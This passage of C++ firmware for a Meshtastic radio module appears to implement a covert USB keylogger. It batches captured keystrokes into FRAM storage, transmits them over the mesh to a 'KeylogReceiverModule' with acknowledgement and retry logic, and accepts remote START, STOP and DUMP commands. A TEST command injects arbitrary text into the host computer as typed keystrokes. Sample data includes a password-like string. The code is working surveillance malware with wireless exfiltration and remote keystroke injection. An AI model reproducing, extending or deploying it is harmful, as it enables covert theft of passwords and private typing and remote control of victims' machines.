    if (mp.decoded.payload.size < ACK_FULL_LEN) {
        LOG_WARN("[USBCapture] ACK payload too short: %u bytes", mp.decoded.payload.size);
        return false;
    }

    /* Extract hex digits (8 chars after "ACK:0x") */
    char hex_str[9];  /* 8 hex digits + null */
    /* NASA Rule 2: Bounded copy */
    memcpy(hex_str, payload + 6, 8);
    hex_str[8] = '\0';

    /* Parse hex to uint32 */
    char *endptr;
    uint32_t acked_batch_id = strtoul(hex_str, &endptr, 16);

    /* Validate parsing succeeded */
    if (endptr != hex_str + 8) {
        LOG_WARN("[USBCapture] Invalid ACK hex format: %s", hex_str);
        return false;
    }

    /* Check if this ACK matches our pending batch */
    if (acked_batch_id != pendingTx.batch_id) {
        LOG_WARN("[USBCapture] ACK batch mismatch: got 0x%08x, expected 0x%08x",
                 acked_batch_id, pendingTx.batch_id);
        return false;
    }

    /* SUCCESS - ACK received for our pending batch! */
    uint32_t latency = millis() - pendingTx.send_time;
    LOG_INFO("[USBCapture] ACK received for batch 0x%08x (latency %u ms, retries %u)",
             pendingTx.batch_id, latency, pendingTx.retry_count);

#ifdef HAS_FRAM_STORAGE
    /* NOW safe to delete batch from FRAM */
    if (framStorage != nullptr && framStorage->isInitialized()) {
        if (framStorage->deleteBatch()) {
            LOG_INFO("[USBCapture] Deleted acknowledged batch from FRAM");
        } else {
            LOG_ERROR("[USBCapture] Failed to delete batch from FRAM after ACK");
        }
    }
#endif

    /* Track success statistics */
    ack_success_count++;

    /* Clear pending state to allow next batch */
    pendingTx.batch_id = 0;
    pendingTx.packet_id = 0;

    return true;
}

// ============================================================================
// MESH MODULE API IMPLEMENTATION
// ============================================================================

ProcessMessage USBCaptureModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    /* Handle PRIVATE_APP packets (ACK responses from KeylogReceiverModule)
     * v6.0: ACK format is "ACK:0x<batch_id>" */
    if (mp.decoded.portnum == meshtastic_PortNum_PRIVATE_APP) {
        if (handleAckResponse(mp)) {
            return ProcessMessage::STOP;  /* ACK handled */
        }
        /* Not an ACK for us - let other modules handle it */
        return ProcessMessage::CONTINUE;
    }

    /* Handle TEXT_MESSAGE_APP (control commands: STATUS, START, STOP, etc.) */
    if (mp.decoded.portnum != meshtastic_PortNum_TEXT_MESSAGE_APP) {
        return ProcessMessage::CONTINUE;
    }

    /* Channel filtering disabled - accept commands from any channel or PKI DMs */

    /* Parse and log command */
    USBCaptureCommand cmd = parseCommand(mp.decoded.payload.bytes, mp.decoded.payload.size);

    /* If it's not a recognized command, let other modules handle it */
    if (cmd == CMD_UNKNOWN) {
        return ProcessMessage::CONTINUE;
    }

    LOG_INFO("[USBCapture] Received command from node 0x%08x", mp.from);

    /* Capture sender as target node for direct messages (auto-capture mode) */
    if (targetNode == 0) {
        targetNode = mp.from;
        LOG_INFO("[USBCapture] Target node set to 0x%08x (auto-captured from first command)", targetNode);
    } else if (targetNode != mp.from) {
        LOG_INFO("[USBCapture] Command from different node 0x%08x (target remains 0x%08x)", mp.from, targetNode);
    }

    /* Execute command */
    char response[MAX_COMMAND_RESPONSE_SIZE];
    size_t len = executeCommand(cmd, mp.decoded.payload.bytes, mp.decoded.payload.size,
                                response, sizeof(response));

    /* Create response packet using module framework (reliable unicast) */
    if (len > 0) {
        myReply = router->allocForSending();
        if (myReply) {
            myReply->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
            myReply->decoded.payload.size = len;
            memcpy(myReply->decoded.payload.bytes, response, len);

            LOG_INFO("[USBCapture] Response prepared: %zu bytes → node 0x%08x", len, mp.from);
            LOG_INFO("[USBCapture] Reply: %.*s", (int)len, response);

            /* Framework will automatically:
             * - Call setReplyTo(myReply, mp) to set proper routing
             * - Set to=mp.from (unicast to sender, not broadcast)
             * - Set channel, hop_limit, want_ack properly
             * - Link request_id = mp.id
             * - Send via service->sendToMesh() with RELIABLE priority
             */
        } else {
            LOG_ERROR("[USBCapture] Failed to allocate response packet");
        }
    }

    return ProcessMessage::STOP;  /* Trigger framework to send myReply */
}

USBCaptureCommand USBCaptureModule::parseCommand(const uint8_t *payload, size_t len)
{
    /* Validate inputs (v3.5) */
    if (!payload || len == 0 || len > MAX_COMMAND_LENGTH) {
        return CMD_UNKNOWN;
    }

    /* Validate payload contains only printable ASCII (prevent malformed packets) */
    for (size_t i = 0; i < len; i++) {
        if (payload[i] < PRINTABLE_CHAR_MIN || payload[i] >= PRINTABLE_CHAR_MAX) {
            LOG_WARN("[USBCapture] Invalid command: non-printable character at position %zu", i);
            return CMD_UNKNOWN;
        }
    }

    /* Convert to uppercase for case-insensitive matching */
    char cmd[MAX_COMMAND_LENGTH];
    size_t cmd_len = (len < sizeof(cmd) - 1) ? len : sizeof(cmd) - 1;

    for (size_t i = 0; i < cmd_len; i++) {
        cmd[i] = toupper(payload[i]);
    }
    cmd[cmd_len] = '\0';

    /* Match command */
    if (strncmp(cmd, "STATUS", 6) == 0) {
        return CMD_STATUS;
    } else if (strncmp(cmd, "START", 5) == 0) {
        return CMD_START;
    } else if (strncmp(cmd, "STOP", 4) == 0) {
        return CMD_STOP;
    } else if (strncmp(cmd, "STATS", 5) == 0) {
        return CMD_STATS;
    } else if (strncmp(cmd, "DUMP", 4) == 0) {
        return CMD_DUMP;
    } else if (strncmp(cmd, "TEST", 4) == 0) {
        return CMD_TEST;
    }

    return CMD_UNKNOWN;
}

size_t USBCaptureModule::executeCommand(USBCaptureCommand cmd, const uint8_t *payload, size_t payload_len,
                                        char *response, size_t max_len)
{
    switch (cmd) {
        case CMD_STATUS:
            return getStatus(response, max_len);

        case CMD_START:
            capture_enabled = true;
            return snprintf(response, max_len, "USB Capture STARTED");

        case CMD_STOP:
            capture_enabled = false;
            return snprintf(response, max_len, "USB Capture STOPPED");

        case CMD_STATS:
            return getStats(response, max_len);

        case CMD_DUMP:
            /* Trigger comprehensive PSRAM buffer dump to logs */
            psram_buffer_dump();
            return snprintf(response, max_len, "PSRAM buffer dump sent to logs");

        case CMD_TEST:
        {
            /* Extract test text after "TEST " prefix
             * Format: "TEST hello world" -> inject "hello world"
             */
            const char *cmd_prefix = "TEST ";
            size_t prefix_len = 5;  // Length of "TEST "

            /* Find start of test text (skip case-insensitive "TEST " prefix) */
            const char *text_start = NULL;
            size_t text_len = 0;

            /* Case-insensitive search for "TEST " prefix */
            if (payload_len > prefix_len)
            {
                /* Check if payload starts with "TEST " (case-insensitive) */
                bool prefix_match = true;
                for (size_t i = 0; i < prefix_len - 1; i++)  // -1 to exclude the space for now
                {
                    char c = toupper(payload[i]);
                    if (c != cmd_prefix[i])
                    {
                        prefix_match = false;
                        break;
                    }
                }

                /* If prefix matches and there's a space or we're at the text */
                if (prefix_match)
                {
                    /* Skip "TEST" and any whitespace */
                    size_t offset = 4;  // Length of "TEST"
                    while (offset < payload_len && (payload[offset] == ' ' || payload[offset] == '\t'))
                    {
                        offset++;
                    }

                    /* Remaining text is what we inject */
                    if (offset < payload_len)
                    {
                        text_start = (const char *)&payload[offset];
                        text_len = payload_len - offset;
                    }
                }
            }

            /* Inject text if we found any */
            if (text_start && text_len > 0)
            {
                /* Validate payload size */
                if (text_len > MAX_TEST_PAYLOAD_SIZE) {
                    return snprintf(response, max_len, "TEST: Payload too large (%zu bytes, max %d)",
                                   text_len, MAX_TEST_PAYLOAD_SIZE);
                }

                /* Call Core1's injection function */
                keyboard_decoder_core1_inject_text(text_start, text_len);

                return snprintf(response, max_len, "TEST: Injected %zu bytes", text_len);
            }
            else
            {
                return snprintf(response, max_len, "TEST: No text provided. Usage: TEST <text>");
            }
        }

        case CMD_UNKNOWN:
        default:
            return snprintf(response, max_len, "UNKNOWN. Valid: STATUS, START, STOP, STATS, DUMP, TEST");
    }
}

size_t USBCaptureModule::getStatus(char *response, size_t max_len)
{
    /* Determine role name for display */
    const char *role_name = "UNKNOWN";
    if (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT_HIDDEN) {
        role_name = "HIDDEN";
    } else if (owner.role == meshtastic_Config_DeviceConfig_Role_CLIENT) {
        role_name = "CLIENT";
    } else if (owner.role == meshtastic_Config_DeviceConfig_Role_ROUTER) {
        role_name = "ROUTER";
    }

    /* Format target node display */
    char target_str[20];
    if (targetNode == 0) {
        snprintf(target_str, sizeof(target_str), "NONE");
    } else {
        snprintf(target_str, sizeof(target_str), "0x%08x", targetNode);
    }

    return snprintf(response, max_len,
        "Node: %s | Role: %s | Capture: %s | Target: %s | Buffers: %u",
        owner.long_name,
        role_name,
        capture_enabled ? "ON" : "OFF",
        target_str,
        psram_buffer_get_count()
    );
}

size_t USBCaptureModule::getStats(char *response, size_t max_len)
{
    // NASA Power of 10: Bounded output with defensive max_len check
    if (max_len == 0) {
        return 0;
    }

    return snprintf(response, max_len,
        "Sent: %lu | Dropped: %lu | Avail: %u | ACK: %lu ok, %lu fail, %lu retry | %s",
        (unsigned long)g_psram_buffer.header.total_transmitted,
        (unsigned long)g_psram_buffer.header.dropped_buffers,
        psram_buffer_get_count(),
        (unsigned long)ack_success_count,
        (unsigned long)ack_timeout_count,
        (unsigned long)ack_retry_count,
        capture_enabled ? "ON" : "OFF"
    );
}

#ifdef USB_CAPTURE_SIMULATE_KEYS
// ==================== Simulation Mode Implementation ====================

/**
 * @brief Test messages for simulation mode
 *
 * These messages simulate typing patterns for testing the full pipeline.
 * Each message will be written as a separate FRAM batch.
 */
static const char *SIM_TEST_MESSAGES[] = {
    "Hello from XIAO simulation mode! Testing ACK system.",
    "This is batch #2 with some test keystrokes for validation.",
    "Testing special chars: user@email.com password123!",
    "Final test batch - checking end-to-end delivery.",
    "Batch 5: The quick brown fox jumps over the lazy dog."
};
static const size_t SIM_MESSAGE_COUNT = sizeof(SIM_TEST_MESSAGES) / sizeof(SIM_TEST_MESSAGES[0]);

bool USBCaptureModule::simulateKeystrokes()
{
    // NASA Rule 4: Check preconditions
    if (!sim_enabled) {
        return false;
    }

    // Check if we've reached the batch limit (0 = infinite)
    if (SIM_BATCH_COUNT > 0 && sim_batch_count >= SIM_BATCH_COUNT) {
        if (sim_enabled) {
            LOG_INFO("[USBCapture] Simulation complete: %lu batches generated",
                     (unsigned long)sim_batch_count);
            sim_enabled = false;
        }
        return false;
    }

    // Check timing interval
    uint32_t now = millis();
    if (now - sim_last_batch_time < SIM_INTERVAL_MS) {
        return false;  // Not time yet
    }

#ifdef HAS_FRAM_STORAGE
    if (framStorage == nullptr || !framStorage->isInitialized()) {
        LOG_ERROR("[USBCapture] Simulation: FRAM not available");
        return false;
    }

    // Select message based on batch count (cycle through messages)
    size_t msg_index = sim_batch_count % SIM_MESSAGE_COUNT;
    const char *message = SIM_TEST_MESSAGES[msg_index];
    size_t msg_len = strlen(message);

    // NASA Rule 2: Enforce fixed bounds
    if (msg_len > SIM_MAX_MESSAGE_LEN) {
        msg_len = SIM_MAX_MESSAGE_LEN;
    }

    // Build FRAM batch in the same format as Core1
    // Format: [start_epoch:4][final_epoch:4][data_length:2][flags:2][data:N]
    uint8_t fram_batch[FRAM_MAX_BATCH_SIZE];
    memset(fram_batch, 0, sizeof(fram_batch));

    // Get current epoch timestamp
    uint32_t current_epoch = getValidTime(RTCQualityFromNet);
    if (current_epoch == 0) {
        current_epoch = millis() / 1000;  // Fallback to uptime
    }

    // Write start_epoch (4 bytes, little-endian)
    fram_batch[0] = (uint8_t)(current_epoch & 0xFF);
    fram_batch[1] = (uint8_t)((current_epoch >> 8) & 0xFF);
    fram_batch[2] = (uint8_t)((current_epoch >> 16) & 0xFF);
    fram_batch[3] = (uint8_t)((current_epoch >> 24) & 0xFF);

    // Write final_epoch (same as start for single message)
    uint32_t final_epoch = current_epoch + 1;  // Add 1 second for realism
    fram_batch[4] = (uint8_t)(final_epoch & 0xFF);
    fram_batch[5] = (uint8_t)((final_epoch >> 8) & 0xFF);
    fram_batch[6] = (uint8_t)((final_epoch >> 16) & 0xFF);
    fram_batch[7] = (uint8_t)((final_epoch >> 24) & 0xFF);

    // Write data_length (2 bytes, little-endian)
    // Include message + Enter marker (0xFF + 2-byte delta)
    uint16_t data_len = (uint16_t)(msg_len + 3);  // +3 for Enter encoding
    fram_batch[8] = (uint8_t)(data_len & 0xFF);
    fram_batch[9] = (uint8_t)((data_len >> 8) & 0xFF);

    // Write flags (2 bytes) - 0 for normal batch
    fram_batch[10] = 0;
    fram_batch[11] = 0;

    // Write keystroke data starting at offset 12
    memcpy(&fram_batch[12], message, msg_len);

    // Add simulated Enter key with delta encoding
    // Format: 0xFF marker + 2-byte delta (time since start in seconds)
    size_t enter_pos = 12 + msg_len;
    fram_batch[enter_pos] = 0xFF;  // DELTA_MARKER
    uint16_t delta = 1;  // 1 second delta for simulation
    fram_batch[enter_pos + 1] = (uint8_t)(delta & 0xFF);
    fram_batch[enter_pos + 2] = (uint8_t)((delta >> 8) & 0xFF);

    // Total batch size: header (12) + message + enter (3)
    uint16_t batch_size = 12 + data_len;

    // Write to FRAM
    if (!framStorage->writeBatch(fram_batch, batch_size)) {
        LOG_ERROR("[USBCapture] Simulation: FRAM write failed");
        return false;
    }

    sim_batch_count++;
    sim_last_batch_time = now;

    LOG_INFO("[USBCapture] SIM batch #%lu written: \"%s\" (%u bytes)",
             (unsigned long)sim_batch_count, message, batch_size);

    return true;
#else
    LOG_WARN("[USBCapture] Simulation requires FRAM storage");
    sim_enabled = false;
    return false;
#endif
}
#endif /* USB_CAPTURE_SIMULATE_KEYS */

#endif /* XIAO_USB_CAPTURE_ENABLED */
